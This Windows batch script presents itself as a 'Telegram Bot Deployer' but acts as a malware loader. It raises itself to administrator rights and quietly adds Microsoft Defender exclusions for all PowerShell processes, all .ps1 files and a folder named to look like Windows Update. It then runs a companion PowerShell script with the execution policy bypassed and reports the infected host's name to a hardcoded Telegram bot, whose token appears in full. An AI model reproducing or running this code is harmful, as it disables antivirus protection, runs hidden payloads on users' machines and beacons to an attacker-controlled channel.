@echo off
title Telegram Bot Deployer
color 0A

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion
set "SCRIPT_DIR=%~dp0"

set "SELECTED=MA01.ps1"
set "LABEL=Maraki Lab 1"

echo ========================================
echo    TELEGRAM BOT DEPLOYER
echo ========================================
echo.

powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue"

echo [INFO] Defender exclusions added.
echo.

set "FOUND_SCRIPT=%SCRIPT_DIR%%SELECTED%"

if not exist "%FOUND_SCRIPT%" (
    echo [ERROR] Script not found: %FOUND_SCRIPT%
    pause
    exit /b 1
)

echo [INFO] Selected: %LABEL% (%SELECTED%)
echo [INFO] Deploying...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%" -BotToken "8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI" -ChatId "7303070402"

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
    echo ========================================
    echo.
    echo [INFO] Deployed on host: %COMPUTERNAME%
    echo.
    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"Deployment Successful!`n`nScript: %SELECTED%`nHost: %COMPUTERNAME%\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg}"
    echo [INFO] Telegram notification sent.
    echo.
) else (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
    echo ========================================
)

exit /b 0
